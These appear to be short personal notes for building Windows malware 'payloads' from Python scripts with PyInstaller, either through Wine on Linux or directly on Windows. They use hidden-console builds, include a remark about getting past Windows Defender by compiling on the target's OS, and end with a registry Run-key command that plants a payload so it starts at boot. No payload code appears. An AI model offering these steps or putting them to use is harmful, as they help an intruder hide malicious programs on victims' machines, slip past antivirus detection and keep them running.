Creating windows executable using wine in linux
================================================

NOTE: payloads generated through linux using wine gets detected by window defender. So its always best to create
payloads using same OS as the attack target

- download python msi file from python official website for windows

- run this file using wine and complete the installation the same way as windows
	$-: wine msiexec /i python-2.7.14.msi 

- all installation will be located in ~/.wine/drive_c directory

- install pyinstaller using windows python executable
	$-: wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller

- now compile the python script using windows pyinstaller by going into the directory where python file is located
	$-: wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe python-script.py --onefile --no-console


Creating windows executable in windows
=======================================

- download python msi file in windows and install it.

- go to installation directory, which is usually C:\python27, which has python.exe located

- now install pyinstaller using
	$-: path/to/python.exe -m pip install pyinstaller

- pyinstaller will be installed in C:\python27\Scripts\pyinstaller.exe

- now compile any python script using pyinstaller by following command
	$: /path/to/pyinstaller.exe python-script.py --one-file --no-console

- payload will be written to dist directory


Planting a payload in a way that it starts when computer starts
================================================================\
- register that payload in windows registery
	$-: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v name_of_program /t REG_SZ /d "path/to/executable.exe"
